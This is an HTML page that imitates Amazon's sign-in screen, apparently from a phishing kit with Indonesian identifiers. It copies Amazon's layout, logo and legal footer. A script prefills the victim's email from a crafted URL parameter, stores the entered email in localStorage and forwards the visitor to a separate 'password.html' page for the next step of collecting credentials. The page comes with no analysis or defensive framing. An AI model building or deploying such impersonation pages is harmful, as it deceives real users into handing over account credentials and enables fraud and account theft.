<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px 20px;
        }
        .logo {
            margin: 10px 0 20px;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 348px;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 12px;
            line-height: 1.2;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
            margin: 18px 0 6px;
            display: block;
        }
        .input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 15px;
            height: 32px;
            outline: none;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .tombol-lanjut {
            width: 100%;
            padding: 6px 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #d5b000;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            margin: 18px 0;
            height: 40px;
        }
        .tombol-lanjut:hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .syarat {
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .syarat a {
            color: #0066c0;
            text-decoration: none;
        }
        .bantuan {
            font-size: 12px;
            margin-bottom: 25px;
        }
        .bantuan a {
            color: #0066c0;
            text-decoration: none;
        }
        .garis-pemisah {
            border-bottom: 1px solid #e7e7e7;
            margin: 20px 0;
        }
        .bisnis {
            font-size: 13px;
        }
        .bisnis strong {
            display: block;
            margin-bottom: 4px;
        }
        .bisnis a {
            color: #0066c0;
            text-decoration: none;
            font-size: 12px;
        }
        .bawah {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e7e7e7;
            width: 100%;
            max-width: 500px;
            text-align: center;
            font-size: 11px;
            color: #555;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .pesan-error {
            color: #d00;
            font-size: 12px;
            margin: 6px 0;
            display: none;
        }
        .pesan-error.tampil {
            display: block;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in or create account</h1>

        <label class="label" for="email">Enter mobile number or email</label>
        <input type="text" id="email" class="input">
        
        <p id="pesan-error" class="pesan-error">Enter your mobile number or email</p>

        <button id="tombol-lanjut" class="tombol-lanjut" onclick="lanjut()">Continue</button>

        <p class="syarat">By continuing, you agree to Amazon's 
            <a href="#">Conditions of Use</a> and 
            <a href="#">Privacy Notice</a>.
        </p>

        <p class="bantuan"><a href="#">Need help?</a></p>

        <div class="garis-pemisah"></div>

        <p class="bisnis">
            <strong>Buying for work?</strong>
            <a href="#">Create a free business account</a>
        </p>
    </div>

    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p style="margin-top: 5px; color: #767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const inputEmail = document.getElementById('email');
const pesanError = document.getElementById('pesan-error');

// Isi otomatis dari parameter URL
window.addEventListener('load', function() {
    const url = window.location.href;
    const cocok = url.match(/-([^-]+@[^-]+)-\d+=aktif/);
    if (cocok && cocok[1]) {
        inputEmail.value = decodeURIComponent(cocok[1]);
    }
});

inputEmail.addEventListener('input', function() {
    if (this.value.trim()) {
        pesanError.classList.remove('tampil');
    }
});

inputEmail.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') lanjut();
});

function lanjut() {
    const email = inputEmail.value.trim();
    
    if (!email) {
        pesanError.classList.add('tampil');
        inputEmail.focus();
        return;
    }

    localStorage.setItem('email_pengguna', email);
    window.location.href = 'password.html';
}
</script>

</body>
</html>
